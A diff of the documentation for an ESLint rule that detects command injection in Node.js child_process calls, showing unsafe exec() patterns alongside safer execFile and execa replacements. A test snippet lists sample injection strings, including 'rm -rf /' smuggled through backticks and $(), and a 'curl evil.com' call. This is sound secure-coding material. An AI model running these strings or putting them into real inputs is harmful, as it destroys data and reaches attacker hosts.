@@ -2,20 +2,26 @@
 
 > **Keywords:** command injection, CWE-78, security, ESLint rule, child_process, exec, spawn, OS command injection, shell injection, auto-fix, LLM-optimized, code security
 
-Detects instances of `child_process` & non-literal `exec()` calls that may allow command injection. This rule is part of [`@forge-js/eslint-plugin-llm-optimized`](https://www.npmjs.com/package/@forge-js/eslint-plugin-llm-optimized) and provides LLM-optimized error messages with fix suggestions.
+Detects instances of `child_process` & non-literal `exec()` calls that may allow command injection. This rule is part of [`eslint-plugin-secure-coding`](https://www.npmjs.com/package/eslint-plugin-secure-coding) and provides LLM-optimized error messages with fix suggestions.
 
 **🚨 Security rule** | **💡 Provides LLM-optimized guidance** | **⚠️ Set to error in `recommended`**
 
 ## Quick Summary
 
-| Aspect | Details |
-|--------|---------|
-| **CWE Reference** | CWE-78 (OS Command Injection) |
-| **Severity** | Critical (security vulnerability) |
-| **Auto-Fix** | ⚠️ Suggests fixes (manual application) |
-| **Category** | Security |
-| **ESLint MCP** | ✅ Optimized for ESLint MCP integration |
-| **Best For** | Node.js applications, deployment scripts, CI/CD tools |
+| Aspect            | Details                                                                         |
+| ----------------- | ------------------------------------------------------------------------------- |
+| **CWE Reference** | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) (OS Command Injection) |
+| **Severity**      | Critical (security vulnerability)                                               |
+| **Auto-Fix**      | ⚠️ Suggests fixes (manual application)                                          |
+| **Category**      | Security                                                                        |
+| **ESLint MCP**    | ✅ Optimized for ESLint MCP integration                                         |
+| **Best For**      | Node.js applications, deployment scripts, CI/CD tools                           |
+
+## Vulnerability and Risk
+
+**Vulnerability:** Unsafe execution of child processes occurs when user input is passed to functions like `exec`, `spawn`, or `execFile` without proper validation or sanitization.
+
+**Risk:** An attacker can inject arbitrary shell commands (Command Injection), allowing them to execute malicious code on the server with the privileges of the Node.js process. This can lead to full system compromise, data exfiltration, or denial of service.
 
 ## Rule Details
 
@@ -75,27 +81,28 @@ The rule provides **LLM-optimized error messages** with command injection preven
 
 ### Message Components
 
-| Component | Purpose | Example |
-|-----------|---------|---------|
-| **Risk Level** | Security severity | `CRITICAL` |
-| **CWE Reference** | Vulnerability type | `CWE-78: OS Command Injection` |
+| Component             | Purpose                | Example                          |
+| --------------------- | ---------------------- | -------------------------------- |
+| **Risk Level**        | Security severity      | `CRITICAL`                       |
+| **CWE Reference**     | Vulnerability type     | `CWE-78: OS Command Injection`   |
 | **Issue Description** | Specific vulnerability | `Command injection in exec call` |
-| **Safe Alternatives** | Recommended methods | `execFile, spawn` |
-| **Refactoring Steps** | Step-by-step fixes | Numbered implementation guide |
-| **Time Estimate** | Effort assessment | `15-25 minutes` |
+| **Safe Alternatives** | Recommended methods    | `execFile, spawn`                |
+| **Refactoring Steps** | Step-by-step fixes     | Numbered implementation guide    |
+| **Time Estimate**     | Effort assessment      | `15-25 minutes`                  |
 
 This format is optimized for:
+
 - 🤖 **LLMs** - Can parse and rewrite command execution patterns
 - 👨‍💻 **Developers** - Clear security context with actionable fixes
 - 🔧 **DevOps** - Proper risk assessment for deployment decisions
 
 ## Configuration
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `allowLiteralStrings` | `boolean` | `false` | Allow exec() with literal strings |
-| `allowLiteralSpawn` | `boolean` | `false` | Allow spawn() with literal arguments |
-| `additionalMethods` | `string[]` | `[]` | Additional child_process methods to check |
+| Option                | Type       | Default | Description                               |
+| --------------------- | ---------- | ------- | ----------------------------------------- |
+| `allowLiteralStrings` | `boolean`  | `false` | Allow exec() with literal strings         |
+| `allowLiteralSpawn`   | `boolean`  | `false` | Allow spawn() with literal arguments      |
+| `additionalMethods`   | `string[]` | `[]`    | Additional child_process methods to check |
 
 ## Examples
 
@@ -147,20 +154,20 @@ async function safeClone(repoUrl: string) {
 
   return execa('git', ['clone', repoUrl], {
     shell: false,
-    stripFinalNewline: true
+    stripFinalNewline: true,
   });
 }
 ```
 
 ## Method Comparison
 
-| Method | Security Risk | Safe Usage | Recommendation |
-|--------|---------------|------------|----------------|
-| `exec()` | HIGH | Only with literals | Avoid for user input |
-| `execSync()` | HIGH | Only with literals | Avoid for user input |
-| `execFile()` | LOW | ✅ Safe with arrays | Preferred for security |
-| `spawn()` | MEDIUM | ✅ Safe with validation | Good for complex commands |
-| `execa` | LOW | ✅ Best practices | Recommended library |
+| Method       | Security Risk | Safe Usage              | Recommendation            |
+| ------------ | ------------- | ----------------------- | ------------------------- |
+| `exec()`     | HIGH          | Only with literals      | Avoid for user input      |
+| `execSync()` | HIGH          | Only with literals      | Avoid for user input      |
+| `execFile()` | LOW           | ✅ Safe with arrays     | Preferred for security    |
+| `spawn()`    | MEDIUM        | ✅ Safe with validation | Good for complex commands |
+| `execa`      | LOW           | ✅ Best practices       | Recommended library       |
 
 ## Security Impact
 
@@ -183,6 +190,7 @@ exec(`git clone ${userInput}`); // 💥 Server compromised
 ## Common Patterns & Fixes
 
 ### Git Operations
+
 ```typescript
 // ❌ DANGEROUS
 exec(`git clone ${repoUrl}`);
@@ -192,6 +200,7 @@ execFile('git', ['clone', repoUrl], { shell: false });
 ```
 
 ### Package Installation
+
 ```typescript
 // ❌ DANGEROUS
 exec(`npm install ${packageName}`);
@@ -201,6 +210,7 @@ execFile('npm', ['install', packageName], { shell: false });
 ```
 
 ### File Operations
+
 ```typescript
 // ❌ DANGEROUS
 exec(`tar -xzf ${archivePath}`);
@@ -210,6 +220,7 @@ execFile('tar', ['-xzf', archivePath], { shell: false });
 ```
 
 ### Dynamic Commands
+
 ```typescript
 // ❌ DANGEROUS
 exec(`${userCommand} ${userArgs}`);
@@ -224,16 +235,18 @@ if (ALLOWED_COMMANDS.includes(userCommand)) {
 ## Migration Guide
 
 ### Phase 1: Audit
+
 ```javascript
 // Enable warnings first
 {
   rules: {
-    '@forge-js/detect-child-process': 'warn'
+    'secure-coding/detect-child-process': 'warn'
   }
 }
 ```
 
 ### Phase 2: Replace exec() calls
+
 ```typescript
 // Find all exec() usage
 exec(command) → execFile(command, [], options)
@@ -241,6 +254,7 @@ exec(command + args) → execFile(command, [args], options)
 ```
 
 ### Phase 3: Add validation
+
 ```typescript
 // Add input validation
 function validateCommand(cmd: string): boolean {
@@ -249,6 +263,7 @@ function validateCommand(cmd: string): boolean {
 ```
 
 ### Phase 4: Use safer libraries
+
 ```typescript
 // Upgrade to execa
 import execa from 'execa';
@@ -258,10 +273,11 @@ await execa('git', ['clone', repoUrl]);
 ## Advanced Configuration
 
 ### Allow Specific Patterns
+
 ```javascript
 {
   rules: {
-    '@forge-js/detect-child-process': ['error', {
+    'secure-coding/detect-child-process': ['error', {
       allowLiteralStrings: true,  // Allow exec('literal command')
       additionalMethods: ['fork'], // Also check fork() calls
     }]
@@ -270,11 +286,12 @@ await execa('git', ['clone', repoUrl]);
 ```
 
 ### Monorepo Setup
+
 ```javascript
 // Root package.json scripts are usually safe
 {
   rules: {
-    '@forge-js/detect-child-process': ['error', {
+    'secure-coding/detect-child-process': ['error', {
       allowLiteralStrings: true,
       ignorePaths: ['scripts/**', 'tools/**']
     }]
@@ -291,7 +308,7 @@ const injectionAttempts = [
   'repo`rm -rf /`',
   'repo$(rm -rf /)',
   'repo; curl evil.com',
-  'repo && evil-command'
+  'repo && evil-command',
 ];
 
 for (const attempt of injectionAttempts) {
@@ -301,13 +318,13 @@ for (const attempt of injectionAttempts) {
 
 ## Comparison with Alternatives
 
-| Feature | detect-child-process | eslint-plugin-security | eslint-plugin-node |
-|---------|---------------------|------------------------|-------------------|
-| **Command Injection Detection** | ✅ Yes | ⚠️ Limited | ⚠️ Limited |
-| **CWE Reference** | ✅ CWE-78 included | ⚠️ Limited | ⚠️ Limited |
-| **LLM-Optimized** | ✅ Yes | ❌ No | ❌ No |
-| **ESLint MCP** | ✅ Optimized | ❌ No | ❌ No |
-| **Fix Suggestions** | ✅ Detailed | ⚠️ Basic | ⚠️ Basic |
+| Feature                         | detect-child-process | eslint-plugin-security | eslint-plugin-node |
+| ------------------------------- | -------------------- | ---------------------- | ------------------ |
+| **Command Injection Detection** | ✅ Yes               | ⚠️ Limited             | ⚠️ Limited         |
+| **CWE Reference**               | ✅ CWE-78 included   | ⚠️ Limited             | ⚠️ Limited         |
+| **LLM-Optimized**               | ✅ Yes               | ❌ No                  | ❌ No              |
+| **ESLint MCP**                  | ✅ Optimized         | ❌ No                  | ❌ No              |
+| **Fix Suggestions**             | ✅ Detailed          | ⚠️ Basic               | ⚠️ Basic           |
 
 ## Related Rules
 
